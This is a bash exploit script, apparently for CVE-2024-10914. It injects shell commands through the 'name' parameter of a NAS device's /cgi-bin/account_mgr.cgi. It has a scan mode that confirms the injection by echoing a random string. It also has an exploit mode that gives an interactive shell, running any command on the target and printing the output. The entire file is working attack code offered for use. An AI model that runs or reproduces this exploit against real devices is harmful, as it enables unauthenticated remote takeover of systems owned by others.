#!/bin/bash

# Print banner
print_banner() {
    echo "
         _______    ________    ___   ____ ___  __ __       _______  ____ _____ __
        / ____/ |  / / ____/   |__ \\ / __ \\__ \/ // /      <  / __ \/ __ <  / // /
       / /    | | / / __/________/ // / / /_/ / // /_______/ / / / / /_/ / / // /_
      / /___  | |/ / /__/_____/ __// /_/ / __/__  __/_____/ / /_/ /\__, / /__  __/
      \____/  |___/_____/    /____/\____/____/ /_/       /_/\____//____/_/  /_/                                                                   
        
            @VeryLazyTech - Medium                            
    "
}

verify() {
    echo "[!] Checking target..."
    local verify_string=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 5 | head -n 1)
    local cmd="echo ${verify_string}"
    local encoded_cmd=$(echo "$cmd" | jq -s -R -r @uri)
    local endpoint="/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;${encoded_cmd};%27"

    response=$(curl -k "${1}${endpoint}" 2>/dev/null)
    
    if [[ "$response" == *"$verify_string"* ]]; then
        echo "[+] Vulnerable"
    else
        echo "[-] OK"
        exit 1
    fi
}

exploit() {
    while true; do
        read -p "VeryLazyTech-Shell$ " cmd
        
        if [[ "$cmd" == "exit" ]]; then
            echo "[!] Exiting exploit mode..."
            break
        fi
        
        encoded_cmd=$(echo "$cmd" | jq -s -R -r @uri)
        endpoint="/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;${encoded_cmd};%27"

        response=$(curl -k "${1}${endpoint}" 2>/dev/null)

        if [ -z "$response" ]; then
            echo "[-] Command not available or returned no output."
        else
            echo "$response"
        fi
    done
}

# Main function
main() {
    local URL=""
    local MODE=""
    
    while getopts "u:s:e:" opt; do
        case ${opt} in
            u ) URL=$OPTARG ;;
            s ) MODE="scan" ;;
            e ) MODE="exploit" ;;
            * ) echo "Usage: $0 -u <target_url> -scan | -exploit" 
                exit 1 ;;
        esac
    done

    if [ -z "$URL" ] || [ -z "$MODE" ]; then
        echo "Target URL and mode are required. Use -u <target_url> -scan | -exploit."
        exit 1
    fi

    print_banner
    
    if [[ "$MODE" == "scan" ]]; then
        verify "$URL"
    elif [[ "$MODE" == "exploit" ]]; then
        verify "$URL"
        echo "[?] Entering exploit mode..."
        exploit "$URL"
    fi
}

main "$@"
